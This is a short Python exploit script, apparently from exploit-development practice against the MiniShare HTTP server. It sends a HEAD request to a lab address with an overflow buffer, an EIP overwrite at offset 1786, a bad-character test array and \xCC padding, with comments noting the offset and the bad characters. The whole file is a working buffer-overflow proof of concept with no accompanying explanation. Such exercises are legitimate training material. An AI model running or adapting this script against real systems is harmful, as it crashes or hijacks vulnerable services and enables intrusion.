"""
/home/exploiter/shared/Mona_Shared/minishare/bytearray.bin  -> Mona Shared Badchar Array
"""
#!/usr/bin/python3
import socket
import sys

"""
HEAD / HTTP/1.1\r\nHost: 192.168.5.128\r\nUser-Agent: curl/7.67.0\r\nAccept: */*\r\n\r\n"""
host = '192.168.5.128'
port = 80

buffer = b"A" * 1786
buffer += b"BBBB"
buffer += open('/home/exploiter/shared/Mona_Shared/minishare/bytearray.bin','rb').read()
buffer += b"\xCC" * (5000-len(buffer))

"""
Badchars : \x00\x0d
"""

"""
Offsets
EIP -> 1786
"""

data = b'HEAD '
data += buffer
data += b" HTTP/1.1\r\n"
data += b"Host: 192.168.5.128\r\n\r\n"


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print("[+]Length of Buffer: " + str(len(buffer)))
print("[+]Sending Exploit")
s.send(data)
s.close()